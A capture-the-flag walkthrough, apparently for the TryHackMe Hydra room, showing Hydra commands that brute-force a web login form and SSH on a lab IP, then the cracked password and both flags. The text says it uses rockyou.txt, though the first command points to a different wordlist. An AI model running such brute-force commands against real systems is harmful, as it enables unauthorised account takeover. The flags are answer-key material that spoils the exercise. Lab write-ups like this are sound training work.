---
title: Hydra
aliases:
  - Hydra
tags:
  - Easy
  - CTF
---
## **Task 1: Introduction to Hydra**

Before starting, ensure you have [[content/Tools/Hydra|Hydra]] installed and ready to use. You can install it using:

```bash
sudo apt install hydra -y
```

Once installed, let’s proceed with the tasks.

---

## **Task 2: Brute-Forcing Web Login**

### **Step 1: Identifying the Login Page**

Navigate to the given IP address in your browser to find the login page.

![[images/Pasted image 20250213134342.png]]
### **Step 2: Running Hydra for Web Login**

Use Hydra to perform a brute-force attack on the login page with the `rockyou.txt` wordlist:

```bash
sudo hydra -l molly -P SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt 10.10.170.68 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect." -V
```

Here’s what each parameter means:

- `-l molly`: Specifies the username.
- `-P rockyou.txt`: Uses `rockyou.txt` as the password list.
- `http-post-form`: Targets a form-based login.
- `/login`: The login page URL.
- `username=^USER^&password=^PASS^`: Inserts Hydra’s username and password attempts.
- `incorrect`: The error message indicating a failed login attempt.
- `-V`: Enables verbose mode to show progress.

### **Step 3: Logging in and Retrieving the Flag**

![[images/Pasted image 20250213134547.png]]
Once Hydra cracks the password, log in using `molly:sunshine`. The first flag is displayed after logging in:  

![[images/Pasted image 20250213134629.png]]
![[images/Pasted image 20250213134654.png]]

**Flag 1:** `THM{2673a7dd116de68e85c48ec0b1f2612e}`

---

## **Task 3: Brute-Forcing SSH Login**

### **Step 1: Running Hydra for SSH**

Use Hydra to brute-force Molly’s SSH credentials:

```bash
hydra -l molly -P SecLists/Passwords/Leaked-Databases/rockyou.txt 10.10.170.68 -t 4 ssh
```

![[images/Pasted image 20250213134842.png]]

Once the password is found, log in via SSH:

```bash
ssh molly@10.10.170.68
```

![[images/Pasted image 20250213134946.png]]
### **Step 2: Retrieving the Flag**

After logging in, list files and read the flag:

```bash
ls
cat flag2.txt
```

![[images/Pasted image 20250213135027.png]]

**Flag 2:** `THM{c8eeb0468febbadea859baeb33b2541b}`

---

Hope this guide helps! 🚀